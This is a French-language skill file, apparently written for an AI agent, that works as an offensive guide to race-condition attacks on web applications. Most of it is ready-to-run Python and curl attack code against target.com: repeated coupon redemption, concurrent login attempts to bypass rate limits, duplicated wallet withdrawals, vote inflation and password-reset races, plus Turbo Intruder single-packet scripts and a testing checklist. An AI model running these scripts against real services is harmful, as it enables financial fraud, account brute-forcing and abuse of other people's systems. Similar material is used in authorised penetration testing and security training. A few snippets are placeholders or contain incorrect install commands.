---
name: race-conditions
description: Guide complet des attaques par Race Condition — TOCTOU, HTTP pipelining, rate limit bypass, time-of-check/time-of-use, outils et techniques
---

# Race Conditions — Guide d'Exploitation Avancé

## Références principales
- **PortSwigger** : https://portswigger.net/web-security/race-conditions
- **HackTricks** : https://hacktricks.wiki/en/pentesting-web/race-condition/
- **PortSwigger Race Condition Research** : https://portswigger.net/research/smashing-the-state-machine

---

## 1. Concepts fondamentaux

Les race conditions surviennent quand un système ne verrouille pas correctement les opérations entre la vérification et l'utilisation (Time-Of-Check / Time-Of-Use — TOCTOU).

### Conditions nécessaires
1. Une opération qui vérifie un état (`check : solde > 0`)
2. Une opération qui utilise l'état (`use : débiter`)
3. Possibilité d'envoyer plusieurs requêtes en parallèle

---

## 2. Types de Race Conditions

### 2.1 TOCTOU (Time-of-check Time-of-use)

```python
# Code vulnérable
def transfert(sender, receiver, amount):
    if sender.balance >= amount:      # Check
        # 🔴 Fenêtre de race ici
        sender.balance -= amount      # Use
        receiver.balance += amount
```

**Exploitation** : Envoyer N requêtes simultanément avant que la première ne soit débitée.

### 2.2 HTTP Pipelining Race

Avec HTTP/1.1 pipelining, envoyer plusieurs requêtes sans attendre les réponses :

```bash
# Envoi de 5 requêtes simultanées
for i in {1..5}; do
  curl -X POST "https://target.com/api/coupon/redeem?code=DISCOUNT100" &
done
wait
```

### 2.3 HTTP/2 Single-Packet Race (PortSwigger — 2023)

HTTP/2 permet d'envoyer **toutes les requêtes dans un seul paquet TCP** via `PRIORITY` frames et `WINDOW_UPDATE`. Les requêtes arrivent littéralement en même temps sur le backend.

```python
# Turbo Intruder — Single Packet Attack
from turbo_intruder import *

def queue_requests(target, frames):
    # Technique : envoyer toutes les requêtes dans un seul paquet
    # Utiliser HTTP/2 + WINDOW_UPDATE pour désactiver le flow control
    pass
```

### 2.4 Rate Limit Bypass Race

```python
import requests
from concurrent.futures import ThreadPoolExecutor

url = "https://target.com/api/login"
payload = {"username": "admin", "password": "password123"}

def try_login(_):
    return requests.post(url, json=payload).status_code

# 100 tentatives de login simultanées → bypass rate limit
with ThreadPoolExecutor(max_workers=50) as executor:
    results = list(executor.map(try_login, range(100)))
    successes = [r for r in results if r == 200]
    print(f"Success: {len(successes)}/100")
```

---

## 3. Techniques d'exploitation

### 3.1 Multi-Threading

```python
import threading
import requests

def exploit():
    url = "https://target.com/api/coupon/redeem"
    data = {"code": "PROMO50"}
    r = requests.post(url, json=data)
    print(f"Status: {r.status_code}, Response: {r.text[:100]}")

threads = []
for _ in range(20):
    t = threading.Thread(target=exploit)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### 3.2 Turbo Intruder (Burp Extension)

```python
# Turbo Intruder — Single Packet Attack
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=True)

    for i in range(50):
        engine.queue(target.req, rand=randstr(6))
        engine.queue(target.req, rand=randstr(6))
        engine.queue(target.req, rand=randstr(6))
```

### 3.3 HTTP/2 Single Packet Attack

```python
# Turbo Intruder — Single Packet Attack (SPA)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=200,
                           pipeline=False,
                           engine=Engine.BURP2)

    for i in range(100):
        engine.queue(target.req, gate=1)

    # Toutes les requêtes sont envoyées en un seul paquet
    engine.openGate(1)
    engine.complete(timeout=60)
```

---

## 4. Cas d'exploitation concrets

### 4.1 Coupon / Discount multiple

```bash
curl -X POST "https://target.com/cart/redeem" \
  -d "coupon=SAVE50" \
  -H "Cookie: session=abc" &
curl -X POST "https://target.com/cart/redeem" \
  -d "coupon=SAVE50" \
  -H "Cookie: session=abc" &
# → 50% de réduction appliqué 2×
```

### 4.2 Vote manipulation

```python
# 100 votes simultanés → 100 votes comptés
url = "https://target.com/vote/up?item=123"
requests.post(url)  # 1 vote
# Avec race → 100 votes
```

### 4.3 Solde bancaire / Wallet

```python
# Retrait maximum : 1000€
# 10 retraits simultanés de 1000€ (si solde non mis à jour)
url = "https://target.com/api/withdraw"
data = {"amount": 1000}
with ThreadPoolExecutor(max_workers=10) as e:
    e.map(lambda _: requests.post(url, json=data), range(10))
```

### 4.4 Password reset token race

```python
# 2 requêtes de reset password simultanées
# → 2 tokens créés → premier token valide + second token valide
url = "https://target.com/api/reset-password"
data = {"email": "victim@test.com"}
r1 = requests.post(url, json=data)
r2 = requests.post(url, json=data)
# → Deux tokens différents, les deux valides
```

### 4.5 Email verification bypass

```python
# Changer email avant vérification
# 1. Demander changement d'email
# 2. Simultanément, vérifier l'ancien email
requests.post("https://target.com/api/change-email", json={"email": "attacker@evil.com"})
requests.post("https://target.com/api/verify-email", json={"code": "123456"})
```

---

## 5. Outils

```bash
# Turbo Intruder (Burp Extension)
# https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988

# Custom scripts
pip install requests threading asyncio aiohttp

# httpx (Go) — rapid HTTP/2
go install github.com/projectdiscovery/httpx/cmd/httpx@latest

# curl parallèle
seq 1 20 | xargs -P20 -I{} curl -s -X POST "https://target.com/api/action" -d "data=value"
```

---

## 6. Détection

```bash
# 1. Identifier les endpoints sensibles
# 2. Envoyer 2-3 requêtes simultanées (Burp Repeater onglets)
# 3. Comparer les réponses
# 4. Si état partagé modifié de façon inattendue → race condition

# Test rapide avec curl parallèle
for i in {1..10}; do
  (curl -s -X POST "https://target.com/api/action" -d "id=$i" &)
done
wait
```

---

## 7. Checklist

```
☐ Identifier les endpoints avec état modifiable (solde, inventaire, votes)
☐ Vérifier les opérations TOCTOU (check avant use)
☐ Tester les coupons/réduction
☐ Tester les retraits/transferts
☐ Tester les votes/likes
☐ Tester les password resets
☐ Tester les email verifications
☐ Tester les rate limit bypass
☐ Tester les inscriptions multiples
☐ Tester avec HTTP/1.1 pipelining
☐ Tester avec HTTP/2 single packet
☐ Tester avec Turbo Intruder
```